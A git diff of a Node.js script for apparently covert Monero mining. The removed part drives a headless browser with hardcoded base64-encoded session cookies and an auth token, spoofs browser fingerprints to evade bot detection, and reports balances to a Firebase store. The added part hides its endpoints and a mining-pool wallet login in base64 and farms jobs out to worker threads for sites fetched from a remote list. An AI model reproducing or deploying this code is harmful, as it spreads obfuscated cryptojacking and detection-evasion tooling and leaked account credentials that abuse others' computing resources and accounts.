@@ -1,292 +1,126 @@
-const puppeteer = require('puppeteer')
+const { Worker, workerData } = require('node:worker_threads')
+const WebSocketClient = require('websocket').client
 const axios = require('axios')
 
-let browser = null
-let page = null
-let ID = null
-let SERVER = ''
-let mUpdate = 0
+let client = new WebSocketClient()
 
-let mUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
+let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
 
-let mData = Buffer.from('W3sibmFtZSI6Il9nYV9GWlBLN0s2TlhMIiwidmFsdWUiOiJHUzEuMS4xNzAyOTE1MTI4LjEuMS4xNzAyOTE1OTMxLjM5LjAuMCIsImRvbWFpbiI6Ii5lby5maW5hbmNlIiwicGF0aCI6Ii8iLCJleHBpcmVzIjoxNzM3NDc1OTMxLjc2MTQ1OSwic2l6ZSI6NTIsImh0dHBPbmx5IjpmYWxzZSwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6ZmFsc2UsInNhbWVQYXJ0eSI6ZmFsc2UsInNvdXJjZVNjaGVtZSI6IlNlY3VyZSIsInNvdXJjZVBvcnQiOjQ0M30seyJuYW1lIjoiX2dhIiwidmFsdWUiOiJHQTEuMS45MzYwOTYwNzguMTcwMjkxNTEyOCIsImRvbWFpbiI6Ii5lby5maW5hbmNlIiwicGF0aCI6Ii8iLCJleHBpcmVzIjoxNzM3NDc1OTMxLjczMjkxNywic2l6ZSI6MjksImh0dHBPbmx5IjpmYWxzZSwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6ZmFsc2UsInNhbWVQYXJ0eSI6ZmFsc2UsInNvdXJjZVNjaGVtZSI6IlNlY3VyZSIsInNvdXJjZVBvcnQiOjQ0M30seyJuYW1lIjoiX19ncGkiLCJ2YWx1ZSI6IlVJRD0wMDAwMGNiNGI1MjY1YWZmOlQ9MTcwMjkxNTEyODpSVD0xNzAyOTE1OTExOlM9QUxOSV9NWUNVVkFuVjRfeFd5TEdGYmw3clBOQ3QwN2N2USIsImRvbWFpbiI6Ii5lby5maW5hbmNlIiwicGF0aCI6Ii8iLCJleHBpcmVzIjoxNzM2NjExMTI4LCJzaXplIjo4OSwiaHR0cE9ubHkiOmZhbHNlLCJzZWN1cmUiOmZhbHNlLCJzZXNzaW9uIjpmYWxzZSwic2FtZVBhcnR5IjpmYWxzZSwic291cmNlU2NoZW1lIjoiU2VjdXJlIiwic291cmNlUG9ydCI6NDQzfSx7Im5hbWUiOiJGQ05FQyIsInZhbHVlIjoiJTVCJTVCJTIyQUtzUm9sX0RGM0t6R2RjRXE0QkNIWVpDLVZfckt5dFhpX2hsazVmOXFrZzRBZFJkcmx6cVFxQXRjN1VMT09BSFNCSFlHSHY5Ni1EVE1Xa2E5Z1JhQmx3aVl5Zk9oNEpXNEQ3T2xqalF1VllvcEE1R0FPVDZSR2ZLdmpfM0p5OGt4RWQ0dmNzZF9Zd1B1cWUtMkRxd0o2dDM5Y2Exek55MldBJTNEJTNEJTIyJTVEJTVEIiwiZG9tYWluIjoiLmVvLmZpbmFuY2UiLCJwYXRoIjoiLyIsImV4cGlyZXMiOjE3MzQ0NTE5MzMsInNpemUiOjE5MSwiaHR0cE9ubHkiOmZhbHNlLCJzZWN1cmUiOmZhbHNlLCJzZXNzaW9uIjpmYWxzZSwic2FtZVBhcnR5IjpmYWxzZSwic291cmNlU2NoZW1lIjoiU2VjdXJlIiwic291cmNlUG9ydCI6NDQzfSx7Im5hbWUiOiJfZ2lkIiwidmFsdWUiOiJHQTEuMi4xMjAwNzY4MTAyLjE3MDI5MTUxMjgiLCJkb21haW4iOiIuZW8uZmluYW5jZSIsInBhdGgiOiIvIiwiZXhwaXJlcyI6MTcwMzAwMjMzMCwic2l6ZSI6MzEsImh0dHBPbmx5IjpmYWxzZSwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6ZmFsc2UsInNhbWVQYXJ0eSI6ZmFsc2UsInNvdXJjZVNjaGVtZSI6IlNlY3VyZSIsInNvdXJjZVBvcnQiOjQ0M30seyJuYW1lIjoiX2djbF9hdSIsInZhbHVlIjoiMS4xLjgzMDA4OTg0LjE3MDI5MTUxMjkiLCJkb21haW4iOiIuZW8uZmluYW5jZSIsInBhdGgiOiIvIiwiZXhwaXJlcyI6MTcxMDY5MTEyOSwic2l6ZSI6MzAsImh0dHBPbmx5IjpmYWxzZSwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6ZmFsc2UsInNhbWVQYXJ0eSI6ZmFsc2UsInNvdXJjZVNjaGVtZSI6IlNlY3VyZSIsInNvdXJjZVBvcnQiOjQ0M30seyJuYW1lIjoidG9rZW4iLCJ2YWx1ZSI6ImFiNWU0YjM5ODQ1M2Q2NWQ4ZWQ0ZGJiNDAwZTdhZDVlYWU4MDIyYzk3OTFiYzFmMGQ4MTNiNmFjYTM2ZmQ4NTI2YjZjY2IyZjVmZjEzY2M2ZmUxMTFmYzRkZTUyMDk5Zjg5MjU3YzE3YTg0MGMzNDhiMWQ3NmUxYTljY2FiZjdiIiwiZG9tYWluIjoiLmVvLmZpbmFuY2UiLCJwYXRoIjoiLyIsImV4cGlyZXMiOjE3Mzc0NzUxNzkuMDIxMTQ5LCJzaXplIjoxMzMsImh0dHBPbmx5IjpmYWxzZSwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6ZmFsc2UsInNhbWVQYXJ0eSI6ZmFsc2UsInNvdXJjZVNjaGVtZSI6IlNlY3VyZSIsInNvdXJjZVBvcnQiOjQ0M30seyJuYW1lIjoiX19nYWRzIiwidmFsdWUiOiJJRD0zMDM5YWY1MzViYzMzYTE3OlQ9MTcwMjkxNTEyODpSVD0xNzAyOTE1OTExOlM9QUxOSV9NWkVHT0owQjhfYjNHblFNVGlKaTJXNmg2VlA1QSIsImRvbWFpbiI6Ii5lby5maW5hbmNlIiwicGF0aCI6Ii8iLCJleHBpcmVzIjoxNzM2NjExMTI4LCJzaXplIjo4OSwiaHR0cE9ubHkiOmZhbHNlLCJzZWN1cmUiOmZhbHNlLCJzZXNzaW9uIjpmYWxzZSwic2FtZVBhcnR5IjpmYWxzZSwic291cmNlU2NoZW1lIjoiU2VjdXJlIiwic291cmNlUG9ydCI6NDQzfSx7Im5hbWUiOiJfZ2FfRjhEUlNTRTJTMCIsInZhbHVlIjoiR1MxLjIuMTcwMjkxNTEyOS4xLjEuMTcwMjkxNTkzMC4wLjAuMCIsImRvbWFpbiI6Ii5lby5maW5hbmNlIiwicGF0aCI6Ii8iLCJleHBpcmVzIjoxNzM3NDc1OTMwLjI3OTYzOCwic2l6ZSI6NTEsImh0dHBPbmx5IjpmYWxzZSwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6ZmFsc2UsInNhbWVQYXJ0eSI6ZmFsc2UsInNvdXJjZVNjaGVtZSI6IlNlY3VyZSIsInNvdXJjZVBvcnQiOjQ0M30seyJuYW1lIjoidXNlcklkIiwidmFsdWUiOiI0MTU4MjUyNTgiLCJkb21haW4iOiIuZW8uZmluYW5jZSIsInBhdGgiOiIvIiwiZXhwaXJlcyI6MTczNzQ3NTE3OS4wMjE1NDEsInNpemUiOjE1LCJodHRwT25seSI6ZmFsc2UsInNlY3VyZSI6ZmFsc2UsInNlc3Npb24iOmZhbHNlLCJzYW1lUGFydHkiOmZhbHNlLCJzb3VyY2VTY2hlbWUiOiJTZWN1cmUiLCJzb3VyY2VQb3J0Ijo0NDN9XQ==', 'base64').toString('ascii')
+let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')
 
-let BASE_URL = Buffer.from('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvbGFiLw==', 'base64').toString('ascii')
-
-let cookies = JSON.parse(mData)
+let mClient = null
+let mJob = null
+let mAccepted = 0
+let mPrevAcpt = 0
+let mWorker = {}
 
 
-process.argv.slice(2).forEach(function (data, index) {
+
+startServer()
+
+async function startServer() {
     try {
-        if (index == 0) {
-            SERVER = 'gmail_'+data
-            if (data.toString().length == 1) {
-                ID = '?worker=00'+data
-            } else if (data.toString().length == 2) {
-                ID = '?worker=0'+data
-            } else {
-                ID = '?worker='+data
-            }
-
-            browserStart()
-        }
-    } catch (error) {
-        ID = ''
-        browserStart()
-    }
-})
-
-async function browserStart() {
-
-    try {
-        console.log('★★★---START---★★★')
-
-        browser = await puppeteer.launch({
-            headless: false,
-            headless: 'new',
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--ignore-certificate-errors',
-                '--ignore-certificate-errors-skip-list',
-                '--disable-dev-shm-usage',
-                '--user-agent='+mUserAgent
-            ]
-        })
-    
-        page = (await browser.pages())[0]
-
-        await page.evaluateOnNewDocument((userAgent) => {
-            Object.defineProperty(navigator, 'platform', { get: () => 'Win32' })
-            Object.defineProperty(navigator, 'productSub', { get: () => '20100101' })
-            Object.defineProperty(navigator, 'vendor', { get: () => '' })
-            Object.defineProperty(navigator, 'oscpu', { get: () => 'Windows NT 10.0; Win64; x64' })
-
-            let open = window.open
-
-            window.open = (...args) => {
-                let newPage = open(...args)
-                Object.defineProperty(newPage.navigator, 'userAgent', { get: () => userAgent })
-                return newPage
-            }
-
-            window.open.toString = () => 'function open() { [native code] }'
-
-        }, mUserAgent)
-
-        await page.setUserAgent(mUserAgent)
-
-        let time = new Date().getTime()
-
-        page.on('console', async (msg) => {
-            try {
-                const txt = msg.text()
-                if (txt.startsWith('STATUS:')) {
-                    let now = new Date().getTime()
-                    if (time < now) {
-                        time = now+5000
-                        console.log(JSON.parse(txt.substring(8,txt.length)))
-                    }
-                }
-            } catch (error) {}
-        })
-
-        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
-
-        await page.setCookie(...cookies)
-        
-        await page.bringToFront()
-
-        //await page.goto('https://server-088.vercel.app/'+ID, { waitUntil: 'load', timeout: 0 })
-        await page.goto('https://miner.eo.finance/', { waitUntil: 'load', timeout: 0 })
-
-        console.log('-----FINISH----')
-
-        await delay(5000)
-
         let size = 0
-        let nonHash = 0
-
-        while (true) {
+        let mList = []
+        await waitForJob()
+        let response = await axios.get(BASE_URL+'website.json')
+        
+        for (let key of Object.keys(response.data)) {
             try {
                 size++
-                let hashrate = await page.evaluate(() => document.querySelector('#hashrate').innerText)
-                
-                if (hashrate == 0 || hashrate == '0') {
-                    nonHash++
-                }
-
-                try {
-                    let xmr = await page.evaluate(() => document.querySelector('#totalBalance').innerText)
-                    let usd = await page.evaluate(() => document.querySelector('#balance_usd').innerText)
-                    
-                    console.log('SIZE: '+size+' HASH: '+hashrate+' XMR: '+xmr+' USD: '+usd)
-
-                    try {
-                        if (SERVER == 'gmail_1' || SERVER == 'gmail_10') {
-                            if (parseFloat(xmr) > 0 && parseFloat(usd) > 0) {
-                                await putAxios(BASE_URL+'status/mining/data.json', JSON.stringify({ xmr:xmr, usd:usd }), {
-                                    headers: {
-                                        'Content-Type': 'application/x-www-form-urlencoded'
-                                    }
-                                })
-                            }
-                        }
-                    } catch (error) {}
-                } catch (error) {
-                    console.log('SIZE: '+size+' HASH: '+hashrate+' XMR: 0 USD: 0')
-                }
-
-                if (nonHash >= 3) {
-                    console.log('----NO-HASH----')
-                    process.exit(0)
-                }
-
-                let now = new Date().getTime()
-
-                if (now > mUpdate) {
-                    mUpdate = now+300000
-                    await putAxios(BASE_URL+'status/mining/'+SERVER+'.json', JSON.stringify({ online:(parseInt(now/1000)+600) }), {
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        }
-                    })
-                }
+                let worker = await addWorker(size, 'https://'+key.replace(/__/g, '-').replace(/_/g, '.'), mJob)
+                worker.on('message', onMessage)
+                mWorker[key] = worker
             } catch (error) {}
-
-            await delay(60000)
         }
+
+        console.log('Worker Size: ', size)
     } catch (error) {
-        console.log(error)
-        console.log('-----ERROR-----')
-        process.exit(0)
+        console.log('Start Server Error')
+
+        await delay(3000)
+        await startServer()
     }
 }
 
-
-async function getFiveSecond(url, first, second) {
-    await page.bringToFront()
-    await page.goto(url, { waitUntil: 'load', timeout: 0 })
-    console.log('-----LOADED----')
-
-    let _timeout = 0
-
+async function waitForJob() {
     while (true) {
-        await page.bringToFront()
         await delay(1000)
-        let timeout = 0
-        _timeout++
-
-        while (true) {
-            timeout++
-            try {
-                await page.bringToFront()
-                let skip = await exists(first)
-    
-                if (skip) {
-                    timeout = 0
-                    break
-                }
-            } catch (error) {}
-    
-            if (timeout > 10) {
-                timeout = 99
-                break
-            }
-            await delay(1000)
-        }
-    
-        if (timeout == 99) {
-            await page.bringToFront()
-            await page.goto(url, { waitUntil: 'load', timeout: 0 })
-        } else {
-            timeout = 0
-            while (true) {
-                timeout++
-                try {
-                    let skip = await exists(second)
-        
-                    if (skip) {
-                        await page.bringToFront()
-                        await delay(250)
-                        await page.click(second)
-                    } else {
-                        timeout = 0
-                        break
-                    }
-                } catch (error) {
-                    timeout = 0
-                    break
-                }
-
-                if (timeout > 10) {
-                    timeout = 99
-                    break
-                }
-        
-                await delay(500)
-            }
-
-            if (timeout == 99) {
-                await page.bringToFront()
-                await page.goto(url, { waitUntil: 'load', timeout: 0 })
-            } else {
-                break
-            }
-        }
-
-        if (_timeout > 3) {
+        if (mJob != null) {
             break
         }
     }
-
-    await delay(1000)
-    await closeAllPage()
 }
 
-async function closeAllPage() {
-    let pages =  await browser.pages()
+function decode(data) {
+    return Buffer.from(data, 'base64').toString('ascii')
+}
 
-    await pages[0].goto('about:blank')
+const addWorker = async (id, url, job) => {
+    return new Promise((resolve, reject) => {
+        let worker = new Worker('./worker.js', { workerData: { id:id, url:url, job:job } })
+        resolve(worker)
+    })
+}
 
-    for (let i = 1; i < pages.length; i++) {
+const onMessage = function(solved) {
+    mAccepted++
+    if (mClient) {
+        mClient.send(JSON.stringify(solved))
+    }
+}
+
+connneckClient()
+
+function connneckClient() {
+    client.on('connectFailed', function(error) {
+        mClient = null
+        console.log('Re-Connect')
+        setTimeout(connneckClient, 2000)
+    })
+    
+    client.on('connect', function(conn) {
+    
+        mClient = conn
+    
+        console.log('WebSocket Client Connected')
+    
+        mClient.send(decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI4NEFiUG0ybUNpQkNoMTgyZ3N2cVNSWExwRWM5SmdVSjk2eDNLUTZoMzVFQ0V0U3pNV0ZEYW1NZFdMOThwVzE2dGY2MXZKaXczNG5ZZk1paThoVFczcGJUREM3QnFURyIsInBhc3N3b3JkIjoidXJsLW1pbmVyIiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ=='))
+    
+        mClient.on('error', function(error) {
+            mClient = null
+            console.log('Re-Connect')
+            setTimeout(connneckClient, 2000)
+        })
+    
+        mClient.on('close', function() {
+            mClient = null
+            console.log('Re-Connect')
+            setTimeout(connneckClient, 2000)
+        })
+    
+        mClient.on('message', function(message) {
+            try {
+                let data = JSON.parse(message.utf8Data)
+                if(data['identifier'] == 'job') {
+                    mJob = data
+                    
+                    console.log('New Job Received.')
+                    sendJob()
+                }
+            } catch (e) {}
+        })
+    })
+    
+    client.connect(WSS)
+}
+
+function sendJob() {
+    for(let worker of Object.values(mWorker)) {
         try {
-            await pages[i].goto('about:blank')
-            await delay(500)
-            await pages[i].close()
+            worker.postMessage(mJob)
         } catch (error) {}
     }
-}
-
-async function exists(element) {
-    return await page.evaluate((element) => {
-        let root = document.querySelector(element)
-        if (root) {
-            return true
-        }
-        return false
-    }, element)
-}
-
-async function putAxios(url, body, data) {
-    let loop = 0
-    let responce = null
-    while (true) {
-        try {
-            data.timeout = 10000
-            responce = await axios.put(url, body, data)
-            break
-        } catch (error) {
-            loop++
-
-            if (loop >= 5) {
-                break
-            } else {
-                await delay(3000)
-            }
-        }
-    }
-    return responce
 }
 
 function delay(time) {
@@ -294,3 +128,12 @@ function delay(time) {
         setTimeout(resolve, time)
     })
 }
+
+setInterval(function() {
+    if(mJob) {
+        if (mAccepted != mPrevAcpt) {
+            console.log('Hash Accepted: ', mAccepted)
+            mPrevAcpt = mAccepted
+        }
+    }
+}, 5000)
